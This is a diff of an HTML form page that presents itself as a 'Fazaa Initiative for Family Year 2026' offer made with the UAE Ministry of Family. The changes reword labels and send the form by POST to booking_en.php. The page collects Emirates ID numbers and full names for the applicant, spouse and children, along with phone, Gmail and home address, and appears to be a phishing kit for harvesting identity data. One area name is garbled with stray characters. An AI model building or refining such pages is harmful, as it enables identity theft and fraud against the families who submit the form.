@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fazaa Initiative for the Year of the Family 2026</title>
+    <title>Fazaa Initiative for Family Year 2026</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
@@ -92,11 +92,11 @@
     </div>
 
     <div class="container">
-        <h1 class="main-title">Fazaa Initiative for the Year of the Family 2026</h1>
-        <p class="sub-title">In cooperation with the Ministry of Family, Fazaa offers exclusive packages to support the quality of life for Emirati families.</p>
+        <h1 class="main-title">Fazaa Initiative for Family Year 2026</h1>
+        <p class="sub-title">In cooperation with the Ministry of Family, Fazaa offers exclusive packages to support the quality of life of UAE families</p>
 
         <div class="steps-container">
-            <div class="step active"><span class="step-num">1</span> Data</div>
+            <div class="step active"><span class="step-num">1</span> Information</div>
             <div class="step-line"></div>
             <div class="step"><span class="step-num">2</span> Confirmation</div>
             <div class="step-line"></div>
@@ -105,15 +105,16 @@
 
         <div class="instructions-box">
             <div class="instructions-header" onclick="toggleInstructions()">
-                <span>Registration Instructions</span>
                 <span class="arrow-icon" id="instructionArrow">▼</span>
+                <span>Registration Instructions</span>
             </div>
             <div class="instructions-content" id="instructionsContent">
-                Please enter your personal data accurately and choose the preferred category type to issue your card successfully.
+                Please enter your personal details accurately and choose your preferred card type to issue your card successfully.
             </div>
         </div>
 
-        <form action="confirmation.html" method="GET" id="registrationForm">
+        <!-- Submission to booking_en.php -->
+        <form action="booking_en.php" method="POST" id="registrationForm">
             <div class="form-section always-show">
                 <h2 class="section-title">Select Card Type</h2>
                 <div class="cards-grid">
@@ -141,66 +142,66 @@
             </div>
 
             <div class="form-section" id="personalSection">
-                <h2 class="section-title">Personal Data</h2>
+                <h2 class="section-title">Personal Information</h2>
                 <div class="input-group">
                     <label>Full Name <span>*</span></label>
-                    <input type="text" name="full_name" class="input-control" placeholder="Please enter your name as in ID">
+                    <input type="text" name="full_name" class="input-control" placeholder="Please write your name as it appears on your ID">
                 </div>
                 <div class="input-group">
                     <label>Emirates ID Number <span>*</span></label>
                     <input type="text" name="emirates_id" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                 </div>
                 <div class="input-group">
-                    <label>Spouse Name <span>*</span></label>
+                    <label>Spouse's Full Name <span>*</span></label>
                     <input type="text" name="spouse_name" class="input-control" placeholder="Full name of spouse">
                 </div>
                 <div class="input-group">
-                    <label>Spouse ID Number <span>*</span></label>
+                    <label>Spouse's Emirates ID Number <span>*</span></label>
                     <input type="text" name="spouse_id" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                 </div>
 
                 <div id="childrenContainer">
                     <div class="children-block child-field" data-child="1">
-                        <span class="child-title">Child Data (1)</span>
+                        <span class="child-title">Child Information (1)</span>
                         <div class="input-group">
-                            <label>Child Name <span>*</span></label>
-                            <input type="text" name="child_name_1" class="input-control" placeholder="Full name of child">
+                            <label>Child Full Name <span>*</span></label>
+                            <input type="text" name="child_name_1" class="input-control" placeholder="Full name of the child">
                         </div>
                         <div class="input-group">
-                            <label>Child ID Number <span>*</span></label>
+                            <label>Child Emirates ID Number <span>*</span></label>
                             <input type="text" name="child_id_1" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                         </div>
                     </div>
                     <div class="children-block child-field" data-child="2">
-                        <span class="child-title">Child Data (2)</span>
+                        <span class="child-title">Child Information (2)</span>
                         <div class="input-group">
-                            <label>Child Name <span>*</span></label>
-                            <input type="text" name="child_name_2" class="input-control" placeholder="Full name of child">
+                            <label>Child Full Name <span>*</span></label>
+                            <input type="text" name="child_name_2" class="input-control" placeholder="Full name of the child">
                         </div>
                         <div class="input-group">
-                            <label>Child ID Number <span>*</span></label>
+                            <label>Child Emirates ID Number <span>*</span></label>
                             <input type="text" name="child_id_2" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                         </div>
                     </div>
                     <div class="children-block child-field" data-child="3">
-                        <span class="child-title">Child Data (3)</span>
+                        <span class="child-title">Child Information (3)</span>
                         <div class="input-group">
-                            <label>Child Name <span>*</span></label>
-                            <input type="text" name="child_name_3" class="input-control" placeholder="Full name of child">
+                            <label>Child Full Name <span>*</span></label>
+                            <input type="text" name="child_name_3" class="input-control" placeholder="Full name of the child">
                         </div>
                         <div class="input-group">
-                            <label>Child ID Number <span>*</span></label>
+                            <label>Child Emirates ID Number <span>*</span></label>
                             <input type="text" name="child_id_3" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                         </div>
                     </div>
                     <div class="children-block child-field" data-child="4">
-                        <span class="child-title">Child Data (4)</span>
+                        <span class="child-title">Child Information (4)</span>
                         <div class="input-group">
-                            <label>Child Name <span>*</span></label>
-                            <input type="text" name="child_name_4" class="input-control" placeholder="Full name of child">
+                            <label>Child Full Name <span>*</span></label>
+                            <input type="text" name="child_name_4" class="input-control" placeholder="Full name of the child">
                         </div>
                         <div class="input-group">
-                            <label>Child ID Number <span>*</span></label>
+                            <label>Child Emirates ID Number <span>*</span></label>
                             <input type="text" name="child_id_4" class="input-control" placeholder="784-XXXX-XXXXXXX-X">
                         </div>
                     </div>
@@ -212,7 +213,7 @@
                         <input type="tel" name="phone" class="input-control" placeholder="05XXXXXXXX">
                     </div>
                     <div class="input-group">
-                        <label>Email (Gmail) <span>*</span></label>
+                        <label>Email Address (Gmail) <span>*</span></label>
                         <input type="email" name="email" class="input-control" placeholder="example@gmail.com">
                     </div>
                     <div class="input-group">
@@ -227,7 +228,7 @@
             </div>
 
             <div class="form-section" id="deliverySection">
-                <h2 class="section-title">Address and Delivery Data</h2>
+                <h2 class="section-title">Address & Delivery Information</h2>
                 <div class="input-group">
                     <label>Emirate <span>*</span></label>
                     <select name="emirate" id="emirateSelect" class="input-control" onchange="updateAreas()">
@@ -249,15 +250,15 @@
                 </div>
                 <div class="input-group">
                     <label>Street Name or Number <span>*</span></label>
-                    <input type="text" name="street" class="input-control" placeholder="Example: Sheikh Zayed Road / Street No. 12">
+                    <input type="text" name="street" class="input-control" placeholder="e.g., Sheikh Zayed Road / Street No. 12">
                 </div>
                 <div class="input-group">
-                    <label>Building Number <span>*</span></label>
-                    <input type="text" name="building" class="input-control" placeholder="Example: Building No. 45 or Tower Name">
+                    <label>Building Number / Name <span>*</span></label>
+                    <input type="text" name="building" class="input-control" placeholder="e.g., Building No. 45 or Tower Name">
                 </div>
                 <div class="input-group">
                     <label>Floor and Apartment Number <span>*</span></label>
-                    <input type="text" name="floor_apartment" class="input-control" placeholder="Example: Floor 4 - Apt 402">
+                    <input type="text" name="floor_apartment" class="input-control" placeholder="e.g., 4th Floor - Apt 402">
                 </div>
             </div>
 
@@ -265,10 +266,10 @@
                 <label class="agreement-container">
                     <input type="checkbox" name="declaration" id="declarationCheckbox" required>
                     <div class="custom-checkbox"></div>
-                    <span>I declare that the data provided is correct and I agree to the terms and conditions</span>
+                    <span>I declare that the provided information is correct and I agree to the Terms & Conditions</span>
                 </label>
                 <div class="form-section always-show" style="background: transparent; box-shadow: none; border: none; padding: 0;">
-                    <button type="submit" class="btn-submit">Submit Application</button>
+                    <button type="submit" class="btn-submit">Submit Request</button>
                 </div>
             </div>
         </form>
@@ -276,21 +277,21 @@
 
     <footer>
         <div class="footer-links">
-            <a href="#">Privacy Policy</a> | <a href="#">Terms and Conditions</a>
+            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a>
         </div>
-        <div class="footer-managed">This site is operated and managed by the Fazaa Initiative for supporting Emirati families.</div>
-        <div class="copyright">&copy; 2026 All rights reserved to Fazaa UAE.</div>
+        <div class="footer-managed">This website is operated and managed by the Fazaa Family Support Initiative.</div>
+        <div class="copyright">&copy; 2026 All Rights Reserved to Fazaa UAE.</div>
     </footer>
 
     <script>
         const areasData = {
             dubai: ["Deira", "Bur Dubai", "JBR", "Marina", "Al Barsha", "Al Khawaneej", "International City", "Silicon Oasis", "Mirdif"],
-            abudhabi: ["Khalidiya", "Mushrif", "Muroor", "Al Raha Beach", "Yas Island", "Saadiyat Island", "MBZ City", "Khalifa City"],
+            abudhabi: ["Al Khalidiyah", "Al Mushrif", "Al Muroor", "Al Raha Beach", "Yas Island", "Saadiyat Island", "Mohammed Bin Zayed City", "Khalifa City"],
             sharjah: ["Al Majaz", "Al Khan", "Al Taawun", "Al Nahda", "Al Shahba", "Al Rahmaniya", "Muwaileh", "Al Qasimia"],
             ajman: ["Al Rashidiya", "Al Nuaimiya", "Al Bustan", "Al Rawda", "Al Mowaihat", "Al Jurf", "Ajman Corniche"],
-            rasalkhaimah: ["Al Dhait", "Al Hamra", "Al Jazirah Al Hamra", "Al Nakheel", "Al Qawasim Corniche", "Gulfar"],
-            fujairah: ["Al Faseel", "Al Maseela", "City Center", "Dibba Al Fujairah", "Qidfa"],
-            ummalquwain: ["Al Muhadhah", "Al Salamah", "Al Rawda", "Al Baladia", "Al Hamra"]
+            rasalkhaimah: ["Al Dhait", "Al Hamra", "Al Jazeera Al Hamra", "Al Nakheel", "Al Qawasim Corniche", "Julfar"],
+            fujairah: ["Al Faseel", "Al Baseerah", "Town Centre", "Dibba Al Fujairah", "Qidfa"],
+            ummalquwain: ["Al Muhadh獨立", "Al Salamah", "Al Rawdah", "Al Baladia", "Al Hamra"]
         };
 
         window.addEventListener('DOMContentLoaded', (event) => {
